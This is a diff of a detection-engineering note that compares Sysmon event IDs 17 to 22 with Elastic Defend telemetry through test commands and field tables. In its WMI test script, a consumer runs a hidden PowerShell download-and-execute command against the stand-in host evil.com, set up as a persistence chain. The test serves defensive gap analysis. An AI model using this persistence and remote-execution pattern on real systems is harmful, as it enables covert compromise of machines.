@@ -3,7 +3,7 @@
 ## Sysmon Config discoveries
 - In the config there needs to be a explicit rule included for the include/exclude RuleGroups to trigger, had missed on the include and did not trigger any eid 6
 
-## Eid 1 Process Create
+## EID 1 Process Create
 Every CreateProcess call generates EID 1. Sysmon hooks this via kernel process-creation callbacks registered through PsSetCreateProcessNotifyRoutineEx. Elastic Defend generates process events with event.action: start via its kernel-mode driver (ElasticEndpoint.sys), capturing equivalent telemetry through ETW and kernel callbacks.
 
 ### Event Generation
@@ -596,11 +596,155 @@ Both detect the ADS creation but Sysmon's advantage is `winlog.event_data.Conten
 ## EID 16 ServiceConfigurationChange **SKIPPED**
 
 
+## EID 17/18  Pipe Created / Connected
+EID 17 fires when a named pipe is created, EID 18 when a process connects to one and is used for interprocess communications.
+
+### Event Generation
+```
+pipe = New-Object System.IO.Pipes.NamedPipeServerStream("msagent_01",[System.IO.Pipes.PipeDirection]::InOut)
+$client = New-Object System.IO.Pipes.NamedPipeClientStream(".", "msagent_01", [System.IO.Pipes.PipeDirection]::InOut)
+$client.Connect(2000)
+```
+
+### Field Comparision
+| Sysmon Rule Field | Sysmon Log Field (EID 17 — CreatePipe) | Sysmon Log Field (EID 18 — ConnectPipe) | Elastic Defend Field | Comment |
+|---|---|---|---|---|
+| `RuleName` | `rule.name`: `-` | `rule.name`: `technique_id=T1021.002,technique_name=SMB/Windows Admin Shares` | `-` | |
+| `EventType` | `winlog.event_data.EventType`: `CreatePipe` | `winlog.event_data.EventType`: `ConnectPipe` | `-` | No EDR equivalent for either |
+| `UtcTime` | `@timestamp` | `@timestamp` | `-` | |
+| `ProcessGuid` | `process.entity_id`| `process.entity_id` | `-` |  |
+| `ProcessId` | `process.pid` | `process.pid` | `-` | |
+| `Image` | `process.executable`| `process.executable` | `-` | |
+| `PipeName` | `file.name` | `file.name` | `-` | Sysmon maps pipe name to `file.name` |
+| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | `-` | |
+| `-` | `user.id`: `S-1-5-18` | `user.id`: `S-1-5-18` | `-` | |
+| `-` | `event.action`: `PipeEvent (Pipe Created)` | `event.action`: `PipeEvent (Pipe Connected)` | `-` | |
+| `-` | `event.type`: `creation` | `event.type`: `access` | `-` | |
+| `-` | `winlog.record_id` | `winlog.record_id` | `-` | |
+
+### Analysis
+EID 17/18 is an EDR gap where it has no named pipe telemetry dataset. Neither `endpoint.events.file`, `endpoint.events.network`, or `endpoint.events.api` capture pipe create or connect events in standard configuration. There are some EDR Behaviour alerts for named pipe so some kind of monitoring exists but to get a broad coverage Sysmon would be essential.
 
 
-## Elastic EDR Advanced Settings
-# Elastic Defend Advanced Settings Reference
+## EID 19/20/21 WmiEvent (WmiEventFilter activity, WmiEventConsumer activity, WmiEventConsumerToFilter activity)
+EID 19 fires on WMI EventFilter creation, EID 20 on EventConsumer creation, EID 21 on FilterToConsumerBinding. Together they capture the full WMI persistence chain.
 
+### Event Generation
+```
+# Full WMI triggers EID 19, 20, and 21
+$FilterName = "TestFilter"
+$ConsumerName = "TestConsumer"
+$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+# EID 19 EventFilter
+$Filter = Set-WmiInstance -Namespace "root\subscription" `
+  -Class "__EventFilter" `
+  -Arguments @{
+    Name = $FilterName
+    EventNamespace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = $Query
+  }
+
+# EID 20 EventConsumer (CommandLineEventConsumer)
+$Consumer = Set-WmiInstance -Namespace "root\subscription" `
+  -Class "CommandLineEventConsumer" `
+  -Arguments @{
+    Name = $ConsumerName
+    CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
+  }
+
+# EID 21 FilterToConsumerBinding
+$Binding = Set-WmiInstance -Namespace "root\subscription" `
+  -Class "__FilterToConsumerBinding" `
+  -Arguments @{
+    Filter = $Filter
+    Consumer = $Consumer
+  }
+
+# Clean up after
+Get-WMIObject -Namespace "root\subscription" -Class "__EventFilter" |
+  Where-Object Name -eq $FilterName | Remove-WmiObject
+Get-WMIObject -Namespace "root\subscription" -Class "CommandLineEventConsumer" |
+  Where-Object Name -eq $ConsumerName | Remove-WmiObject
+Get-WMIObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" |
+  Where-Object { $_.Filter -match $FilterName } | Remove-WmiObject
+```
+
+### Field Comparision
+| Sysmon Rule Field | Sysmon Log Field (EID 19 — WmiFilterEvent) | Sysmon Log Field (EID 20 — WmiConsumerEvent) | Sysmon Log Field (EID 21 — WmiBindingEvent) | Elastic Defend Field | Comment |
+|---|---|---|---|---|---|
+| `RuleName` | `rule.name` | `rule.name` | `rule.name` | `-` | EDR has no WMI subscription telemetry |
+| `EventType` | `winlog.event_data.EventType` | `winlog.event_data.EventType` | `winlog.event_data.EventType` | `-` | |
+| `Operation` | `winlog.event_data.Operation` | `winlog.event_data.Operation` | `winlog.event_data.Operation` | `-` | Would be `Create`or `Deleted` |
+| `UtcTime` | `@timestamp` | `@timestamp` | `@timestamp` | `-` | |
+| `Name` | `winlog.event_data.Name` | `winlog.event_data.Name` | `-` | `-` | EID 21 has no `Name` field identity comes from `Consumer` and `Filter` fields instead |
+| `EventNamespace` | `winlog.event_data.EventNamespace` | `-` | `-` | `-` | EID 19 only WMI namespace being subscribed to |
+| `Query` | `winlog.event_data.Query` | `-` | `-` | `-` | EID 19 only the WQL trigger condition |
+| `Type` | `-` | `winlog.event_data.Type` | `-` | `-` | EID 20 only consumer type |
+| `Destination` | `-` | `process.executable` | `-` | `-` | EID 20 only the command or script to execute |
+| `Consumer` | `-` | `-` | `winlog.event_data.Consumer` | `-` | EID 21 only consumer reference in the binding |
+| `Filter` | `-` | `-` | `winlog.event_data.Filter` | `-` | EID 21 only filter reference in the binding. Correlate with EID 19 `Name` to link the triad |
+| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | `user.name` + `user.domain` | `-` | |
+| `-` | `winlog.activity_id` | `winlog.activity_id` | `winlog.activity_id` | `-` |  |
+| `-` | `-` | `-` | `-` | `process.executable`: `WmiPrvSE.exe` | EDR only indirect signal. WmiPrvSE.exe spawning with `-Embedding` but carries none of the subscription details |
+| `-` | `-` | `-` | `-` | `process.parent.executable`: `svchost.exe -k DcomLaunch` | EDR only parent chain confirms DCOM-initiated WmiPrvSE launch |
+| `-` | `-` | `-` | `-` | `process.Ext.effective_parent.*` | EDR only effective parent | 
+
+### Analysis
+EID 19/20/21 is a complete EDR gap for WMI subscription detection specifically. Elastic Defend produces no events in any dataset that capture the filter name, query, consumer type, destination command, or binding relationship etc. There is however about 15 different EDR Behavior alerts for WMI and WMIC.
+
+
+## EID 22 DNSEvent (DNS query)
+EID 22 fires on every DNS query made by any process. Sysmon hooks the DNS client via ETW.
+
+### Event Generation
+```Resolve-DnsName "evil.com"```
+
+### Field Comparision
+| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
+|---|---|---|---|
+| `RuleName` | `rule.name` | `-` | EDR has no rule tagging |
+| `UtcTime` | `@timestamp` | `@timestamp` | Sysmon: `13:53:22`. EDR: `13:53:16` EDR ~6s earlier, hooks DNS client at a lower layer |
+| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different formats Sysmon `{GUID}`, EDR opaque string |
+| `ProcessId` | `process.pid` | `process.pid` | |
+| `Image` | `process.executable` | `process.executable` | |
+| `QueryName` | `dns.question.name` | `dns.question.name` | |
+| `-` | `dns.question.registered_domain` | `-` | Sysmon ECS enrichment only: `evil.com` |
+| `-` | `dns.question.top_level_domain` | `-` | Sysmon ECS enrichment only: `com` |
+| `QueryStatus` | `sysmon.dns.status` | `dns.Ext.status` | Sysmon: `SUCCESS`. EDR: `0` (numeric). Both indicate resolution success |
+| `QueryResults` | `dns.resolved_ip` | `dns.resolved_ip` | Sysmon: `66.96.146.129`. EDR: `::ffff:66.96.146.129` (IPv4-mapped IPv6 format) |
+| `-` | `dns.answers[].data` | `-` | Sysmon ECS enrichment: `66.96.146.129` |
+| `-` | `dns.answers[].type` | `-` | Sysmon ECS enrichment: `A` record type |
+| `-` | `network.protocol` | `network.protocol` | Both: `dns` |
+| `-` | `-` | `dns.Ext.options` | EDR only DNS query option flags |
+| `-` | `-` | `destination.port` | EDR only confirms DNS port |
+| `-` | `-` | `network.destination.port` | EDR only |
+| `-` | `-` | `event.action`: `lookup_result` | EDR uses `lookup_result`. Sysmon uses `DNSEvent (DNS query)` |
+| `-` | `-` | `event.outcome`: `success` | EDR only explicit outcome field |
+| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Both present. Sysmon `user.id`: `S-1-5-18`. EDR `user.id`: actual user SID |
+| `-` | `-` | `process.code_signature.*` | EDR only signing status of querying process |
+| `-` | `-` | `process.Ext.code_signature.*` | EDR only extended signature with thumbprint |
+| `-` | `winlog.record_id` | `-` | Sysmon only |
+
+### Analysis
+Both sensors cover DNS query telemetry well with no critical gaps on either side. Two differences worth noting for rule writing. The dns.resolved_ip format differs Sysmon returns plain IPv4 (66.96.146.129) while EDR returns IPv4-mapped IPv6 notation (::ffff:66.96.146.129). Also a change in timestamp but would need more testing to confirm if they detect at different layers.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Elastic EDR Advanced Settings
 ## Windows
 
 ### Agent & Connectivity
